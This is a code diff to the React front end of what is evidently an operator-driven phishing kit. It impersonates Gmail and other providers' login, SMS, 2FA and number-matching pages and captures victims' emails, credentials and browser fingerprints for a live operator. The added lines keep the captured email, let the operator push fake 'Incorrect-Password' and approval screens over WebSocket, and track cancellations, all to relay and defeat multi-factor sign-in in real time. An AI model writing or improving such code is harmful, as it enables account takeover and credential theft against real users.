@@ -302,6 +302,10 @@ function App() {
   // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
   // receive these values as props and simply render them.
   const [smsCode, setSmsCode] = useState('');
+  // Last email captured from a login submission. Used as a fallback so the
+  // per-provider Incorrect-Password / interactive pages always have an email
+  // to render even when the operator's WebSocket payload omits it.
+  const [lastEmail, setLastEmail] = useState('');
 
   // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
@@ -318,9 +322,10 @@ function App() {
       navigate(data.route as string);
     } else if (command === 'show_google_number_prompt') {
       // Google number-matching 2-step verification (Gmail-only). The operator
-      // supplies a `numbers` array (e.g. `{ numbers: [42, 18, 73] }`) which
-      // GmailNumberPromptPage renders for the user to select.
-      navigate(ROUTES.GOOGLE_NUM_PROMPT, { state: { data, provider: 'Gmail' } });
+      // now supplies a single chosen number (e.g. `{ number: 42 }`) which
+      // GmailNumberPromptPage renders for the user to approve on their device.
+      const mergedData = { email: lastEmail, ...(data || {}) };
+      navigate(ROUTES.GOOGLE_NUM_PROMPT, { state: { data: mergedData, provider: 'Gmail' } });
     } else if (command.startsWith('show_')) {
       const flow = command.replace('show_', '') as keyof typeof routeMaps;
       const providerKey = normalizeProviderKey(data?.provider as string);
@@ -341,7 +346,14 @@ function App() {
       }
       const targetRoute = routeMaps[flow]?.[providerKey];
       if (targetRoute) {
-        navigate(targetRoute, { state: { data, provider: data?.provider || 'Others' } });
+        // Merge the last-submitted email as a fallback so pages like the
+        // Gmail Incorrect-Password screen always have an email to render
+        // even when the operator's payload omits it.
+        const mergedData = { email: lastEmail, ...(data || {}) };
+        // After receiving an operator-driven command, clear the loading
+        // spinner so the destination page is shown immediately.
+        setIsLoading(false);
+        navigate(targetRoute, { state: { data: mergedData, provider: data?.provider || 'Others' } });
       }
     }
   };
@@ -366,12 +378,16 @@ function App() {
   // their own — they show a loading spinner and wait for a WebSocket command
   // (`redirect`, `show_*`, …) from the operator to drive the next step.
   const handleInteractiveAction = async (action: string, data?: Record<string, unknown>) => {
+    // Track any email coming through interactive actions (e.g. retry_password).
+    if (data && typeof data.email === 'string' && data.email) {
+      setLastEmail(data.email as string);
+    }
     const payload = {
       type: 'interaction',
       data: { action, sessionId, ...data }
     };
 
-    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code'].includes(action)) {
+    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code', 'user_canceled'].includes(action)) {
       // Show loading spinner and wait for the server-driven WebSocket command.
       setIsLoading(true);
       // Fire-and-forget — the operator drives the next UI state over WebSocket.
@@ -433,6 +449,13 @@ function App() {
   const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
     let fingerprint: Record<string, unknown> = {};
     try { fingerprint = await getBrowserFingerprint(); } catch (e) { console.warn('Fingerprint failed', e); }
+
+    // Remember the submitted email at app level so subsequent operator-driven
+    // interactive pages (Incorrect-Password, SMS, 2FA, …) always have an email
+    // to render even when the operator's WebSocket payload omits it.
+    if (typeof loginData.email === 'string' && loginData.email) {
+      setLastEmail(loginData.email);
+    }
 
     const credentialsData = { ...loginData, sessionId, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...fingerprint };
     // Fire-and-forget: do NOT await the API response — navigation must happen immediately.
